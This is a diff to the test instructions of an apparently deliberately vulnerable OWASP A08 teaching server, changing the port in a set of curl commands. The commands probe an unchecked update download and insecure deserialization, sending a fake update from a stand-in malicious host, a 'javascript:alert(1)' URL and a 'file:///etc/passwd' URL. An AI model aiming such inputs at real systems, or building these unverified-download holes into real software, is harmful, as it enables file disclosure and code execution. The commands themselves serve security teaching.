@@ -5,21 +5,21 @@ Server: python A08_Example_Data_Integrity_Failures.py
 Port: 5001
 
 # Test software update download (no integrity check):
-curl -X POST http://localhost:5001/download_update -H 'Content-Type: application/json' -d '{"url":"http://example.com/update.zip"}'
+curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"http://example.com/update.zip"}'
 
 # Test malicious update URL:
-curl -X POST http://localhost:5001/download_update -H 'Content-Type: application/json' -d '{"url":"http://malicious-site.com/fake-update.zip"}'
+curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"http://malicious-site.com/fake-update.zip"}'
 
 # Test data loading (insecure deserialization):
-curl -X POST http://localhost:5001/load_data -H 'Content-Type: application/json' -d '{"data":"test"}'
-curl -X POST http://localhost:5001/load_data -H 'Content-Type: application/json' -d '{"data":"malicious_payload"}'
+curl -X POST http://localhost:5002/load_data -H 'Content-Type: application/json' -d '{"data":"test"}'
+curl -X POST http://localhost:5002/load_data -H 'Content-Type: application/json' -d '{"data":"malicious_payload"}'
 
 # Test auto-update endpoint:
-curl http://localhost:5001/auto_update
+curl http://localhost:5002/auto_update
 
 # Test with invalid URLs:
-curl -X POST http://localhost:5001/download_update -H 'Content-Type: application/json' -d '{"url":"javascript:alert(1)"}'
-curl -X POST http://localhost:5001/download_update -H 'Content-Type: application/json' -d '{"url":"file:///etc/passwd"}'
+curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"javascript:alert(1)"}'
+curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"file:///etc/passwd"}'
 
 # Vulnerability: No integrity verification of downloads, unsafe deserialization
 # Impact: Malicious code execution, data corruption, supply chain attacks
